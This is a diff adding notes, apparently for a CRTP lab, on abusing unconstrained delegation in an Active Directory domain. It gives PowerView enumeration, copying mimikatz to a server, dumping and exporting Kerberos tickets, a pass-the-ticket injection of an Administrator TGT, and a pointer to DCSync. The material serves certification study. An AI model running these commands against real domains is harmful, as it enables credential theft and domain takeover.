@@ -2084,3 +2084,54 @@ john.exe --wordlist=C"\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes
  ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/efd84534-6ff7-4c0b-a404-584962a1011f)
 
 you were able to access the dcorp-mgmt device through the svcadmin user because he can execute the MSSQLsvc service in the dcrop-mgmt deivce
+
+# Priv Esc - Unconstrained Delegation
+### Discover domain computers that have unconstrained delegation
+Domain Controllers always show up, ignore them
+```
+ . .\PowerView_dev.ps1
+Get-Netcomputer -UnConstrained
+Get-Netcomputer -UnConstrained | select samaccountname
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/92da62fa-7cae-4a99-bdae-ccdf0facf993)
+
+Two devices have unconstrained delegation feature. The first one is DC which always having UnConstained Delegation in it so we will ignore it
+
+we will focus on dcopr-appsrv. to apply the attack you must be hacked the machine and have the local admin privilege 
+
+we need Local Administrator privilege because we need to get the TGT using mimikatz 
+
+here the appadmin user is a local administrator on the dcorp-appsrv
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cb59fee8-0856-423f-8d7b-910a7b02f638)
+
+now we already accessed the computer that has unconstrained delegation 
+
+now load mimikatz to the computer
+```
+$sess = New-PSSession -ComputerName dcorp-appsrv
+
+Copy-Item -Path C:\AD\Tools\mimikatz_trunk\x64\mimikatz.exe -Destination C:\Users\Administrator\Desktop\ -ToSession $sess
+```
+Get all the TGT tickets that are on the memory
+```
+.\mimikatz.exe "sekurlsa::tickets" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e224b4b7-43e7-4d98-b6d3-0bc5729a797e)
+
+TGT ticket for the administrator on the memory
+
+now you need to export the TGT ticket
+```
+.\mimikatz.exe "sekurlsa::tickets /export" "exit"
+```
+now you need to inject the ticket in the session that you have
+```
+.\mimikatz.exe "kerberos::ptt [0;8d2043]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cdf0cf1e-dd99-41c8-91fe-bd6fca17f178)
+
+now you can explore DC files and run some commands OR you can perform DCSync attack and get the NTLM Hash of the Administrator
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a1b480db-c2a1-4cb5-985e-395c337dea3c)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/56bf212c-932b-42d1-aab8-26b89f15ee13)
